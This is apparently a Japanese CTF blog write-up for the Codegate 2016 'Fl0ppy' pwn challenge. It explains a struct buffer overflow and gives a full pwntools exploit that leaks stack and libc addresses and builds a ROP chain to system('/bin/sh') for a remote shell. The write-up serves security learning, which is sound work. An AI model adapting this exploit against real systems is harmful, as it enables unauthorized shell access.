---
layout: post
redirect_from:
  - /writeup/ctf/2016/codegate-ctf-2016-fl0ppy/
  - /blog/2017/01/20/codegate-ctf-2016-fl0ppy/
date: "2017-01-20T22:50:20+09:00"
tags: [ "ctf", "writeup", "pwn", "codegate-ctf" ]
"target_url": [ "https://github.com/ctfs/write-ups-2016/tree/master/codegate-ctf-2016/pwn/Fl0ppy-315" ]
---

# Codegate CTF 2016 : Fl0ppy

## problem

libcは与えられてない(けど既知として解いた)。

```
$ ./fl0ppy
===========================================================================

1. Choose floppy

2. Write

3. Read

4. Modify

5. Exit

>
1
===========================================================================

Which floppy do you want to use? 1 or 2?

```

## solution

`4. Modify`/`1 Description`にbuffer overflowの脆弱性。適当にleakさせてそのまま`system("/bin/sh")`が呼べる。

構造は以下のようになっている。`description`に$36$文字まで突っ込めるのでもう一方の`data`を書き換えstack上へ向け、rop chainを書き込む。

``` c
struct floppy_t {
    int is_usable; // 0x0
    char *data; // malloc(0x200); // 0x4
    char description[10]; // 0x8
    int data_length; // strlen(data); // 0x14
}; // 0x18

main() {
    floppy_t floppy_2; // ebp-0x3c
    floppy_t floppy_1; // ebp-0x24
    ...
}
```

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='localhost')
parser.add_argument('port', nargs='?', default=8000, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--libc')
args = parser.parse_args()
context.log_level = args.log_level

libc = ELF(args.libc)

p = remote(args.host, args.port)

def choose(x):
    p.recvuntil('>\n')
    p.sendline('1')
    p.sendline(str(x))
def write(data, descr):
    p.recvuntil('>\n')
    p.sendline('2')
    p.sendline(data)
    p.sendline(descr)
def read():
    p.recvuntil('>\n')
    p.sendline('3')
    p.recvuntil('DESCRIPTION: ')
    descr = p.recvuntil('DATA: ', drop=True)
    data = p.recvuntil('===========================================================================', drop=True)
    return descr, data
def modify(y, s):
    p.recvuntil('>\n')
    p.sendline('4')
    p.sendline(str({ 'description': 1, 'data': 2 }[y]))
    assert len(s) + 1 <= 0x25
    p.sendline(s)

# leak stack address
choose(1)
write('foo', 'bar')
modify('description', 'A' * 0x10)
descr, _ = read()
return_addr = u32(descr[0x14 :][: 4]) - 4
log.info('stack addr: %#x', return_addr)

# leak libc address
choose(2)
write('foo', 'bar')
modify('description', 'A' * 0x14 + p32(return_addr))
choose(1)
_, data = read()
log.info(repr(data))
libc_start_main = u32(data[: 4]) - 247
log.info('__libc_start_main: %#x', libc_start_main)
libc_base = libc_start_main - libc.symbols['__libc_start_main']
log.info('libc base: %#x', libc_base)

# write rop chain
choose(1)
payload = ''
payload += p32(libc_base + libc.symbols['system'])
payload += 'AAAA'
payload += p32(libc_base + next(libc.search('/bin/sh')))
modify('data', payload)

# fire
p.recvuntil('>\n')
p.sendline('5')
time.sleep(1)
p.sendline('id')
p.interactive()
```
